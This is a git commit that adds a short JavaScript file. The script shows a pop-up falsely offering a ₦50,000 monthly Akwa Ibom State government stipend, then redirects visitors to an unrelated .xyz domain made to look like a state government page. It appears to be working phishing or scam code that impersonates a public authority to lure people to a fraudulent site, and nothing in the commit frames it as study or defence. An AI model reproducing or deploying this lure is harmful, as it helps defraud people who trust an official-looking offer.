ffaaef9f8e17def744ce86aa09dc69aa4aeada07
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-10-22 01:02:10 -0700

    Create activation-akwaibomstate.js

---
+++ activation-akwaibomstate.js
@@ -0,0 +1,5 @@
+var password = 'Stipend ₦50,000'
+password=prompt('AKWA IBOM STATE: Your Pathway To Success Is Here to Receive ₦50,000.00 monthly stipend, kindly press Ok To Register Now ','Stipend ₦50,000');
+if (password != 'Stipend ₦50,000') {
+location.href='https://todyforu.xyz/akwaibomstate.gov.ng.html';
+}
